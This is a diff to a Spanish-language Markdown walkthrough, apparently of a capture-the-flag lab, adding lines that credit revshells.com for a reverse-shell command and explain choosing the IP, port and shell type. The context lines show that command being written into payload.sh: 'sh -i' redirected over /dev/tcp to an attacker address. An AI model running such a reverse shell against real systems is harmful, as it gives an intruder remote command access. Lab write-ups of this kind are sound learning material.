@@ -148,6 +148,12 @@ Luego procedemos a crear un archivo de script (payload.sh en este caso) que cont
 echo "sh -i > & /dev/tcp/10.10.14.28/9090 0>&1" | tee -a payload.sh
 ```
 
+Este comando lo podemos obetener de la siguiente página
+
+[url](https://www.revshells.com/)
+
+Donde especificamos la ip, el puerto y el tipo que en este caso es sh
+
 También le otorgamos permisos de ejecución al archivo
 
 ```
